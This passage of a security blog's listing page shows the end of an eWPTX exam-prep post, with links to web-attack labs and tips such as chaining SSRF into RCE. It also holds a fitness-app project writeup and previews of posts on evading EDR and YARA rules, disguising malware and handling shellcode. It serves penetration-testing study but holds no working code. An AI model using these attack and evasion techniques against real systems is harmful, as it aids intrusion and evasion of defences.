cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)\n- Business Logic Vulnerabilities\n    - [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)\n    - [Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)\n    - [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)\n- JWT Attacks\n    - [JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)\n    - [JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)\n- GraphQL API[](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)\n    - [Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)\n    - [Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)\n- API Testing\n    - [Exploiting server-side parameter pollution in a query string](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)\n    - [Exploiting an API endpoint using documentation](https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation) \n- OAuth authentication\n    - [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)\n    - [Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)\n- SQL Injection\n    - I Recommend doing this manually and using SQLMap.\n    - [Querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)\n    - [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)\n    - [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)\n    - [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)\n    - [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)\n- XSS\n    - [Use XSS to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)\n    - [Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)\n    - [Exploiting XSS to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)\n- CSRF\n    - [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)\n- XXE\n    - [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)\n    - [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)\n    - [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)\n- Clickjacking \n    - [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)\n- CORS \n    - [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)\n- SSTI\n    - [Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)\n- SSRF\n    - [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)\n    - [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)\n- Insecure Deserialization\n    - [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)\n    - [Using application functionality  o exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)\n    - [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)\n\n## Useful Tips\n- If you see an SSRF vulnerability, try to chain it with SSTI or Java Deserialization to gain RCE.\n    \n- The lab environment isn&#39;t very stable, so take screenshots of the vulnerabilities you find immediately. This is important because you need to write a report at the end. I actually failed my first attempt because I couldn&#39;t replicate two critical vulnerabilities, so I couldn&#39;t take the required screenshots.\n    \n- You tried to exploit the `X` vulnerability during the exam, but it didn&#39;t work. If you&#39;re sure about the payload you sent, don&#39;t forget to restart the lab environment.\n    \n- To pass the exam, you need to fully exploit every identified vulnerability. For example, if you find a SQL injection vulnerability, you need to exploit it to dump the database.\n\n- I recommend creating a report template in [Sysreport](https://github.com/Syslifters/sysreptor), so you only need to insert the vulnerabilities you find during the exam. This made the process of writing a report much quicker for me.\n\n\n### After following all the steps above, you should now be able to pass the eWPTXv2 exam. Best of luck!&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/how-to-pass-ewptx-free-materials-only.mdx&quot;],&quot;digest&quot;:[0,&quot;4b4adabca12b103f&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;how-to-pass-ewptx-free-materials-only&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/pass-ewptx.CJIoSk5m.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;academy-fitness-app.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Academy: Fitness &amp; Nutrition App&quot;],&quot;date&quot;:[3,&quot;2022-10-26T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/academy-app.png&quot;],&quot;tags&quot;:[1,[[0,&quot;C#&quot;],[0,&quot;.NET Framework&quot;],[0,&quot;SQLite&quot;],[0,&quot;Desktop Application&quot;],[0,&quot;Fitness&quot;],[0,&quot;Visual Studio&quot;],[0,&quot;Windows Forms&quot;],[0,&quot;Programming&quot;]]],&quot;description&quot;:[0,&quot;A fitness &amp; nutrition management app built with C#, .NET, and SQLite. Featuring workout planning, meal tracking, macros calculation, and scheduling capabilities.&quot;],&quot;featured&quot;:[0,0],&quot;repo&quot;:[0,&quot;andrecrafts/Academy&quot;],&quot;stars&quot;:[0,0],&quot;projectSlug&quot;:[0,&quot;andrecrafts/Academy&quot;]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\n\n&lt;h3 align=\&quot;center\&quot;&gt;\n  A fitness &amp; nutrition app built with C#, .NET, and SQLite.\n&lt;/h3&gt;\n\n\n## Overview\n\nAcademy is a desktop fitness &amp; nutrition management application designed to help bodybuilders and fitness enthusiasts organize every aspect of their fitness journey. From workout planning to macro calculations and meal scheduling, Academy provides a complete suite of tools for managing your fitness goals.\n\nThis project was developed to polish C#, .NET, and SQLite skills while creating a practical, free tool for daily fitness &amp; nutrition management.\n\n**Project Status: Completed**\n\n## Technology Stack\n\n- **.NET Framework** - version 4.7.2\n- **Visual Studio 2022** - Community Edition\n- **C#** - Core programming language\n- **SQLite** - Database management\n\n## Features\n\n### Core Functionality\n\n**Workout Planning**\n- Custom workout routine builder\n- Exercise library and management\n- Rep and set tracking\n\n**Calendar System**\n- Workout schedule management\n- Synchronous workout plans (fixed weekly schedules)\n- Asynchronous workout plans (flexible scheduling)\n- Event reminders (competitions, important dates)\n\n**Analytics Suite**\n\n*Meal Planning*\n- 2-6 meals per day configuration\n- Custom ingredients editor\n- Nutritional tracking\n\n*Macros Calculator*\n- TDEE-based calorie calculations\n- Fat type breakdown\n- Goal-specific planning:\n  - Bulking protocols\n  - Recomposition/Maingain\n  - Cutting strategies\n- Weight target progression tables\n\n*Physique Tracking*\n- BMI calculator\n- Ideal weight calculator\n- Progress monitoring\n\n**Additional Features**\n- User authentication system\n- Settings configuration\n- Credits and attribution\n\n## Screenshots\n### Login Interface\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Login Screen\&quot; src=\&quot;images/212474231-19cb2d64-0797-4492-8f66-5e45f8969081.png\&quot;/&gt;\n\n### Workout Planner\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Workout Planner\&quot; src=\&quot;images/212475233-c075216e-5e1f-4bdd-8b12-9298dceff416.png\&quot;/&gt;\n\n### Calendar Views\n\n**Main Calendar**\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Calendar\&quot; src=\&quot;images/212476167-2f68cc6b-ff45-4370-9a30-e7521ce7665b.png\&quot;/&gt;\n\n**Synchronous Plans**\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Sync Calendar\&quot; src=\&quot;images/212476203-21a668c0-55cb-4bc5-9f68-19e5d1238413.png\&quot;/&gt;\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Sync Calendar\&quot; src=\&quot;images/212476206-0b0645a2-ce73-48b5-a189-eff534f1116f.png\&quot;/&gt;\n\n**Asynchronous Plans**\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Async Calendar\&quot; src=\&quot;images/212476269-325ce4dd-8a7b-4197-acb6-61fd61c320fc.png\&quot;/&gt;\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Async Calendar\&quot; src=\&quot;images/212476273-f330a416-0220-4fba-9667-ecf6f8249e13.png\&quot;/&gt;\n\n**Event Management**\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Event Add\&quot; src=\&quot;images/212476326-cd977652-708a-41dc-97d3-9c02a05ddfb8.png\&quot;/&gt;\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Event Editor\&quot; src=\&quot;images/212476321-76b3101d-3af5-4dd9-b4b2-f3382a39c794.png\&quot;/&gt;\n\n### Analytics Dashboard\n- &lt;Image height=\&quot;250\&quot; alt=\&quot;Meal Planner\&quot; src=\&quot;images/212477291-b14b8624-7a42-450c-9723-c4691e9e1b2a.png\&quot;/&gt;\n\n## Installation &amp; Setup\n\n**Download:** [Latest Release](https://github.com/WafflesExploits/Academy/releases/tag/Release)\n\n### Building from Source\n\n1. Clone the repository\n2. Open the project in Visual Studio 2022\n3. Build and run the solution\n\n**Important Note:** Due to SQLite library limitations in Visual Studio, Academy currently requires the Visual Studio environment to run properly. The standalone executable may not function correctly due to missing SQLite.Interop DLLs.\n\n## Usage\n\nAcademy assists with:\n- **Macro and calorie tracking** - Precise nutritional planning based on your goals\n- **Workout organization** - Structured training programs\n- **Daily planning** - Schedule management and reminders\n- **Progress tracking** - Monitor your fitness journey\n\n## Calorie Calculation Methodology\n\nAcademy uses the Mifflin St. Jeor equation for BMR calculation:\n\n```\nTDEE = BMR × Activity Multiplier\n\nBMR Formulas:\n  Men:   BMR = 10×Weight + 6.25×Height - 5×Age + 5\n  Women: BMR = 10×Weight + 6.25×Height - 5×Age - 161\n\nActivity Multipliers:\n  1.2   - Sedentary (little to no exercise)\n  1.375 - Lightly Active (exercise 1-3 days/week)\n  1.465 - Moderately Active (exercise 3-4 days/week)\n  1.55  - Active (intense exercise 4-5 days/week)\n  1.725 - Very Active (intense exercise 6-7 days/week)\n  1.9   - Extra Active (very hard daily exercise or physical job)\n```\n\n## Project Reflection\n\nWhile Visual Studio is excellent for learning, scaling to 10,000+ lines revealed significant IDE-specific challenges and bug persistence. Despite these limitations, Academy successfully achieved all envisioned core features and serves its intended purpose as a comprehensive fitness management tool.\n\n### Known Limitations\n\n**Technical Constraints:**\n- SQLite dependencies prevent standalone execution outside Visual Studio\n- Fixed resolution UI design\n- Requires Visual Studio environment to run\n\n**Design Trade-offs:**\n- UI evolved from aesthetic focus to efficiency-driven design\n- Some components (rounded buttons) couldn&#39;t be implemented due to stability issues\n\n**Note:** This project is complete and won&#39;t receive further updates. Future iterations would benefit from responsive UI design, proper dependency packaging, modern frameworks (WPF, Avalonia), and cross-platform compatibility.&quot;],&quot;filePath&quot;:[0,&quot;src/content/projects/academy-fitness-app.mdx&quot;],&quot;digest&quot;:[0,&quot;4261dbef62136810&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;projects&quot;],&quot;slug&quot;:[0,&quot;academy-fitness-app&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/academy-app.owvlYEU-.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}]]],&quot;CardsPerPage&quot;:[0,4],&quot;currentPageNum&quot;:[0,2],&quot;initialViewFilter&quot;:[0,&quot;posts&quot;],&quot;data-astro-cid-vavxtnxe&quot;:[0,true]}" ssr client="load" opts="{&quot;name&quot;:&quot;WorkCardGrid&quot;,&quot;value&quot;:true}" await-children><div class="flex flex-col items-center justify-center gap-4 px-4"><div class="flex mx-auto justify-center items-center gap-4 w-full max-w-50 flex-wrap md:max-w-150 lg:max-w-200 2xl:max-w-350"><style>
    .title-clamp {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3; /* Limit to 3 lines */
      overflow: hidden;
    }

    .description-clamp {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3; /* Limit to 3 lines */
      overflow: hidden;
      overflow-wrap: anywhere;
    }
  </style><div class="flex-shrink-0 h-95 w-70"><div class="bg-secondary border-2 border-secondary-accent 
rounded-xl overflow-hidden flex flex-col h-full 
will-change-transform transition-all transform duration-300 
[@media(hover:hover)]:hover:border-sky-700 [@media(hover:hover)]:hover:text-sky-500 
[@media(hover:hover)]:hover:shadow-[0_0_20px_#3d95f540] [@media(hover:hover)]:hover:-translate-y-2"><div class="relative"><a href="/posts/bypass-yara-rule-cobaltstrike"><div class="w-full aspect-[204/100] rounded-lg 
bg-black flex justify-center items-center"><img src="/_astro/bypass_yara_f0b627fc_evade_edrs.D_48sdOF.png" width="1285" height="630" alt="Bypass YARA Rule f0b627fc for CobaltStrike to Evade EDRs" loading="lazy" decoding="async" class="w-auto h-full"/></div></a><a class="absolute top-1.5 right-1.5
flex justify-center items-center p-2 rounded-full
bg-gray-800/60 text-white hover:bg-gray-800/80 
transition-colors duration-200 transform" href="https://github.com/andrecrafts/CobaltStrike-YARA-Bypass-f0b627fc" target="_blank" rel="noopener noreferrer" aria-label="View Project on Github"><svg class="w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><g transform="translate(12, 12) scale(0.98) translate(-12, -12)"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"></path></g></svg></a></div><a href="/posts/bypass-yara-rule-cobaltstrike" class="m-4 flex flex-col flex-grow overflow-hidden"><h3 class="title-clamp text-lg leading-tight font-bold mb-2" title="Bypass YARA Rule f0b627fc for CobaltStrike to Evade EDRs">Bypass YARA Rule f0b627fc for CobaltStrike to Evade EDRs</h3><p class="description-clamp text-sm text-subtle-gray mb-4 break-all" title="Bypass Yara Rule Windows_Trojan_CobaltStrike_f0b627fc by randomizing its shellcode signature using a Python script.">Bypass Yara Rule Windows_Trojan_CobaltStrike_f0b627fc by randomizing its shellcode signature using a Python script.</p><div class="mt-auto"><div title="EDR Evasion, Cobalt Strike, Python, YARA Evasion, Shellcode, Red Team, Programming" class="flex gap-2 mb-4"><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">EDR Evasion</span><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">Cobalt Strike</span></div><div class="flex items-center text-sm text-subtle-gray"><span class="mr-auto">16 Oct 2024</span><span>43</span><svg class="w-5 h-5 text-yellow-400 -mt-1 ml-1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg></div></div></a></div></div><style>
    .title-clamp {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3; /* Limit to 3 lines */
      overflow: hidden;
    }

    .description-clamp {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3; /* Limit to 3 lines */
      overflow: hidden;
      overflow-wrap: anywhere;
    }
  </style><div class="flex-shrink-0 h-95 w-70"><div class="bg-secondary border-2 border-secondary-accent 
rounded-xl overflow-hidden flex flex-col h-full 
will-change-transform transition-all transform duration-300 
[@media(hover:hover)]:hover:border-sky-700 [@media(hover:hover)]:hover:text-sky-500 
[@media(hover:hover)]:hover:shadow-[0_0_20px_#3d95f540] [@media(hover:hover)]:hover:-translate-y-2"><div class="relative"><a href="/posts/spoofing-file-details"><div class="w-full aspect-[204/100] rounded-lg 
bg-black flex justify-center items-center"><img src="/_astro/spoofing-file-details.D_yqCAKs.png" width="1286" height="630" alt="Make Your Malware Look Legitimate: Spoofing File Details" loading="lazy" decoding="async" class="w-auto h-full"/></div></a></div><a href="/posts/spoofing-file-details" class="m-4 flex flex-col flex-grow overflow-hidden"><h3 class="title-clamp text-lg leading-tight font-bold mb-2" title="Make Your Malware Look Legitimate: Spoofing File Details">Make Your Malware Look Legitimate: Spoofing File Details</h3><p class="description-clamp text-sm text-subtle-gray mb-4 break-all" title="Learn how to make your malware appear as legitimate software by adding an icon to your malware, and copying file properties from real programs.">Learn how to make your malware appear as legitimate software by adding an icon to your malware, and copying file properties from real programs.</p><div class="mt-auto"><div title="EDR Evasion, C++, Shellcode, Shellcode Loader, Malware Development, AV Evasion, Red Team, Stealth Techniques, Programming" class="flex gap-2 mb-4"><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">EDR Evasion</span><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">C++</span><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">Shellcode</span></div><div class="flex items-center text-sm text-subtle-gray"><span class="mr-auto">13 Oct 2024</span></div></div></a></div></div><style>
    .title-clamp {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3; /* Limit to 3 lines */
      overflow: hidden;
    }

    .description-clamp {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3; /* Limit to 3 lines */
      overflow: hidden;
      overflow-wrap: anywhere;
    }
  </style><div class="flex-shrink-0 h-95 w-70"><div class="bg-secondary border-2 border-secondary-accent 
rounded-xl overflow-hidden flex flex-col h-full 
will-change-transform transition-all transform duration-300 
[@media(hover:hover)]:hover:border-sky-700 [@media(hover:hover)]:hover:text-sky-500 
[@media(hover:hover)]:hover:shadow-[0_0_20px_#3d95f540] [@media(hover:hover)]:hover:-translate-y-2"><div class="relative"><a href="/posts/how-to-build-malware-lab-elastic-edr"><div class="w-full aspect-[204/100] rounded-lg 
bg-black flex justify-center items-center"><img src="/_astro/malware-testing-lab.FpYsyurl.png" width="1285" height="630" alt="How to Easily Build a Malware Testing Lab with Elastic EDR and TCM&#x27;s AD Lab" loading="lazy" decoding="async" class="w-auto h-full"/></div></a></div><a href="/posts/how-to-build-malware-lab-elastic-edr" class="m-4 flex flex-col flex-grow overflow-hidden"><h3 class="title-clamp text-lg leading-tight font-bold mb-2" title="How to Easily Build a Malware Testing Lab with Elastic EDR and TCM&#x27;s AD Lab">How to Easily Build a Malware Testing Lab with Elastic EDR and TCM&#x27;s AD Lab</h3><p class="description-clamp text-sm text-subtle-gray mb-4 break-all" title="Learn how to create your own malware testing lab with Elastic EDR and TCM Security&#x27;s AD lab for malware evasion testing.">Learn how to create your own malware testing lab with Elastic EDR and TCM Security&#x27;s AD lab for malware evasion testing.</p><div class="mt-auto"><div title="Malware Lab, EDR Setup, Elastic EDR, Cybersecurity, Red Team, Penetration testing" class="flex gap-2 mb-4"><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">Malware Lab</span><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">EDR Setup</span></div><div class="flex items-center text-sm text-subtle-gray"><span class="mr-auto">22 Sept 2024</span></div></div></a></div></div><style>
    .title-clamp {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3; /* Limit to 3 lines */
      overflow: hidden;
    }

    .description-clamp {
      display: -webkit-box;
      -webkit-box-orient: vertical;
      -webkit-line-clamp: 3; /* Limit to 3 lines */
      overflow: hidden;
      overflow-wrap: anywhere;
    }
  </style><div class="flex-shrink-0 h-95 w-70"><div class="bg-secondary border-2 border-secondary-accent 
rounded-xl overflow-hidden flex flex-col h-full 
will-change-transform transition-all transform duration-300 
[@media(hover:hover)]:hover:border-sky-700 [@media(hover:hover)]:hover:text-sky-500 
[@media(hover:hover)]:hover:shadow-[0_0_20px_#3d95f540] [@media(hover:hover)]:hover:-translate-y-2"><div class="relative"><a href="/posts/store-read-convert-shellcode-in-bin-c-arrays-cpp-and-xxd"><div class="w-full aspect-[204/100] rounded-lg 
bg-black flex justify-center items-center"><img src="/_astro/work_with_shellcode.BPYdDllS.png" width="1285" height="630" alt="Store, Read, and Convert Shellcode in .bin and C Arrays: C++ and xxd" loading="lazy" decoding="async" class="w-auto h-full"/></div></a></div><a href="/posts/store-read-convert-shellcode-in-bin-c-arrays-cpp-and-xxd" class="m-4 flex flex-col flex-grow overflow-hidden"><h3 class="title-clamp text-lg leading-tight font-bold mb-2" title="Store, Read, and Convert Shellcode in .bin and C Arrays: C++ and xxd">Store, Read, and Convert Shellcode in .bin and C Arrays: C++ and xxd</h3><p class="description-clamp text-sm text-subtle-gray mb-4 break-all" title="Learn to store and read shellcode in .bin files using C++, and quickly convert between .bin files and C arrays with xxd.">Learn to store and read shellcode in .bin files using C++, and quickly convert between .bin files and C arrays with xxd.</p><div class="mt-auto"><div title="Shellcode, C++, Malware, Malware Development, Maldev, C, xxd, Linux, Hacking, Programming" class="flex gap-2 mb-4"><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">Shellcode</span><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">C++</span><span class="whitespace-nowrap text-xs text-white bg-secondary-accent px-1.7 py-1 rounded-md">Malware</span></div><div class="flex items-center text-sm text-subtle-gray"><span class="mr-auto">1 Sept 2024</span></div></div></a></div></div></div><nav class="pagination-nav mt-8 flex justify-center items-center gap-2 flex-wrap"><a href="/posts/1" class="text-2xl select-none">&lt;</a><a href="/posts/1" class="bg-secondary-accent rounded px-3 py-1 select-none">1</a><a href="/posts/2" class="font-bold bg-sky-600 rounded px-3 py-1 select-none">2</a><a href="/posts/3" class="bg-secondary-accent rounded px-3 py-1 select-none">3</a><a href="/posts/3" class="text-2xl select-none">&gt;</a></nav></div><!--astro:end--></astro-island> </form>  </main> <footer id="contact" class="bg-header border-t-1 border-white " data-astro-cid-sz7xmlte> <div class="container mx-auto pt-8 pb-10 px-4 text-center" data-astro-cid-sz7xmlte> <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6 2xl:mb-4" data-astro-cid-sz7xmlte>
Let's Build Something Together
</h2> <p class="mb-6 text-lg" data-astro-cid-sz7xmlte>
Have a project in mind or just want to chat?
<br data-astro-cid-sz7xmlte>Feel free to reach out at
<span id="email-text" class="font-bold" data-astro-cid-sz7xmlte>andrecrafts.work@gmail.com</span> <button id="copy-button" class="-mt-1 -ml-0.5 
relative group inline-flex items-baseline 
highlight-btn cursor-pointer transition-colors duration-300
" aria-label="Copy email address" data-astro-cid-sz7xmlte> <svg class="w-6 h-6 translate-y-1.7" data-astro-cid-sz7xmlte="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5"> <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path> </svg> <div id="tooltip" role="tooltip" class="
absolute md:text-nowrap -top-7.1 left-1/2 -translate-x-1/2 z-10 px-1 py-1 
text-sm font-medium text-white bg-secondary-accent 
rounded-sm shadow-sm opacity-0 
[@media_(hover:hover)]:group-hover:opacity-100 pointer-events-none transition-opacity duration-300" data-astro-cid-sz7xmlte> <span id="tooltip-text" data-astro-cid-sz7xmlte>Copy email</span> <div class="
tooltip-arrow absolute w-3 h-1.5 top-full left-1/2 -translate-x-1/2" data-astro-cid-sz7xmlte></div> </div> </button> </p> <a href="https://cal.com/andrecrafts/meet" target="_blank" rel="noopener noreferrer" aria-label="Google Calendar Meeting" class="
  text-white text-lg font-bold 
  py-3 px-6 mb-8 rounded-lg inline-block 
  bg-sky-500 transition-all duration-300
  hover:scale-105 hover:bg-sky-400 transform will-change-transform" data-astro-cid-sz7xmlte>
Schedule Meeting
</a> <div class="flex justify-center space-x-6 mb-6" data-astro-cid-sz7xmlte> <a href="https://github.com/andrecrafts" target="_blank" rel="noopener noreferrer" aria-label="GitHub" class="hover:text-sky-500 transition-colors duration-300" data-astro-cid-sz7xmlte> <svg class="w-8 h-8" data-astro-cid-sz7xmlte="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"> <g transform="translate(12, 12) scale(0.98) translate(-12, -12)"> <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"></path> </g> </svg> </a> <a href="https://linkedin.com/in/andre0liveira" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" class="hover:text-sky-500 transition-colors duration-300" data-astro-cid-sz7xmlte> <svg class="w-8 h-8" data-astro-cid-sz7xmlte="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"> <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path> </svg> </a> </div> <p class="text-sm text-slate-300" data-astro-cid-sz7xmlte>
© 2025 AndreCrafts. All Rights Reserved.
</p> </div> </footer> <script type="module">function a(){const t=document.getElementById("copy-button"),e=document.getElementById("tooltip"),o=document.getElementById("tooltip-text");!t||!e||!o||(t.addEventListener("click",async()=>{try{await navigator.clipboard.writeText("andrecrafts.work@gmail.com"),o.innerText="Copied!",e.classList.add("opacity-100")}catch(n){console.error(n);return}window.matchMedia("(hover: hover)").matches||(t.classList.add("highlight-btn"),setTimeout(()=>{e.classList.remove("opacity-100"),t.classList.remove("highlight-btn")},1500),setTimeout(()=>{o.innerText="Copy email"},1800))}),t.addEventListener("mouseleave",()=>{window.matchMedia("(hover: hover)").matches&&(e.classList.remove("opacity-100"),setTimeout(()=>{o.innerText="Copy email"},300))}))}document.addEventListener("DOMContentLoaded",a);</script>  </body></html> <!-- "Glue Code" Script to connect static controls to the URL --> <script type="module">function g(){const s=document.getElementById("filters-form");if(!s)return;f(),p(),h(),m(),d();function d(){const n=document.querySelector(".search-input"),o=n.querySelector('input[type="text"]');n.addEventListener("click",()=>{o.focus()})}function f(){function n(){const r=new FormData(s),i=new 